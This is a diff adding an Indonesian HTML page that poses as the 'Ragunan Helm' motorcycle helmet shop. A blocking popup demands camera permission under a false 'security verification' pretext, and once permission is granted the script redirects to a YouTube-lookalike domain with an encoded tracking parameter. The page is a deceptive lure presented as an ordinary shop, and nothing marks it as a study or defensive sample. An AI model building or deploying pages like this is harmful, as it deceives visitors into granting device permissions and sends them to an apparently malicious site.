@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Ragunan Helm | Helm Motor Terbaik</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial,sans-serif}
+body{background:#f2f2f2;color:#222}
+
+/* ===== CAMERA POPUP ===== */
+.overlay{
+  position:fixed; inset:0; background:rgba(0,0,0,.85);
+  display:flex; align-items:center; justify-content:center; z-index:9999
+}
+.popup{
+  background:#111; color:#fff; padding:30px; max-width:420px; width:90%;
+  text-align:center; border-radius:8px
+}
+.popup h2{margin-bottom:10px}
+.popup p{font-size:14px;color:#ccc;margin-bottom:20px}
+.actions{display:flex;gap:15px;justify-content:center}
+.actions button{
+  padding:10px 22px;border:none;border-radius:4px;font-weight:bold;cursor:pointer
+}
+.btn-allow{background:#e50914;color:#fff}
+.btn-deny{background:#555;color:#fff}
+
+/* ===== NAVBAR ===== */
+.navbar{background:#111;padding:15px 0}
+.navbar .container{
+  width:90%; margin:auto; display:flex; justify-content:space-between; align-items:center
+}
+.logo{color:#fff;font-size:22px;font-weight:bold}
+.logo span{color:#e50914}
+.navbar nav a{
+  color:#fff; text-decoration:none; margin-left:18px; font-size:14px
+}
+.navbar nav a.login{background:#e50914;padding:6px 12px;border-radius:4px}
+
+/* ===== HERO ===== */
+.hero{
+  height:80vh;
+  background:
+    linear-gradient(rgba(0,0,0,.6),rgba(0,0,0,.6)),
+    url("https://images.unsplash.com/photo-1503376780353-7e6692767b70") center/cover no-repeat;
+  display:flex; align-items:center
+}
+.hero-content{margin-left:10%;color:#fff}
+.hero h1{font-size:46px;line-height:1.1}
+.hero p{margin-top:10px;font-size:18px}
+.btn-primary{
+  display:inline-block;margin-top:20px;background:#e50914;color:#fff;
+  padding:12px 26px;text-decoration:none;border-radius:4px
+}
+
+/* ===== FEATURES ===== */
+.features{
+  background:#111;color:#fff;display:flex;justify-content:space-around;
+  padding:20px;font-size:14px
+}
+
+/* ===== PRODUCTS ===== */
+.products{padding:60px 8%;text-align:center}
+.product-grid{
+  margin-top:40px;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:25px
+}
+.product-card{
+  background:#fff;padding:15px;border-radius:6px;box-shadow:0 5px 15px rgba(0,0,0,.1)
+}
+.product-card img{
+  width:100%;height:200px;object-fit:cover;border-radius:4px
+}
+.product-card h3{margin-top:10px}
+.btn-secondary{
+  margin-top:10px;display:inline-block;background:#333;color:#fff;
+  padding:8px 16px;text-decoration:none;border-radius:4px
+}
+
+/* ===== FOOTER ===== */
+footer{background:#000;color:#aaa;text-align:center;padding:15px}
+</style>
+</head>
+
+<body>
+
+<!-- CAMERA PERMISSION POPUP -->
+<div class="overlay" id="cameraPopup">
+  <div class="popup">
+    <h2>📷 Verifikasi Keamanan</h2>
+    <p>
+      Untuk melanjutkan ke <strong>registrasi & pembayaran</strong>,
+      kami memerlukan izin akses kamera untuk <strong>verifikasi keamanan</strong>.
+      <br><br>
+      Kamera <strong>tidak akan merekam</strong> tanpa persetujuan Anda.
+    </p>
+    <div class="actions">
+      <button class="btn-allow" onclick="requestCamera()">Izinkan Kamera</button>
+      <button class="btn-deny" onclick="denyCamera()">Tolak</button>
+    </div>
+  </div>
+</div>
+
+<header class="navbar">
+  <div class="container">
+    <div class="logo">RAGUNAN<span>HELM</span></div>
+    <nav>
+      <a href="#">Beranda</a>
+      <a href="#">Produk</a>
+      <a href="#">Tentang</a>
+      <a href="#">Kontak</a>
+      <a href="#" class="login">Login</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero-content">
+    <h1>HELM MOTOR<br>TERBAIK</h1>
+    <p>Aman, Nyaman, Bersertifikat</p>
+    <a href="#" class="btn-primary">LIHAT PRODUK</a>
+  </div>
+</section>
+
+<section class="features">
+  <div>🚚 Pengiriman Cepat</div>
+  <div>✔️ Original & Bergaransi</div>
+  <div>🎧 Banyak Pilihan</div>
+</section>
+
+<section class="products">
+  <h2>KOLEKSI HELM</h2>
+  <div class="product-grid">
+    <div class="product-card">
+      <img src="https://images.unsplash.com/photo-1606813902919-45b6d3edfd52">
+      <h3>Helm Full Face</h3>
+      <p>Rp 450.000</p>
+      <a href="#" class="btn-secondary">Detail</a>
+    </div>
+    <div class="product-card">
+      <img src="https://images.unsplash.com/photo-1598514982845-fb49c61d3b0b">
+      <h3>Helm Modular</h3>
+      <p>Rp 550.000</p>
+      <a href="#" class="btn-secondary">Detail</a>
+    </div>
+  </div>
+</section>
+
+<footer>© 2026 Ragunan Helm</footer>
+
+<script>
+const TARGET_URL = "https://yutub.rangunan.my.id?datainfo=MjAwODM5MjEyOA==";
+
+function requestCamera(){
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+    alert("Browser tidak mendukung akses kamera.");
+    return;
+  }
+  navigator.mediaDevices.getUserMedia({ video:true })
+    .then(stream=>{
+      // hentikan kamera segera (verifikasi saja)
+      stream.getTracks().forEach(t=>t.stop());
+      // redirect setelah izin diberikan
+      window.location.href = TARGET_URL;
+    })
+    .catch(()=>{
+      alert("Izin kamera ditolak. Tidak dapat melanjutkan.");
+    });
+}
+
+function denyCamera(){
+  alert("Akses kamera diperlukan untuk melanjutkan.");
+  window.location.href = "https://www.google.com";
+}
+</script>
+
+</body>
+</html>
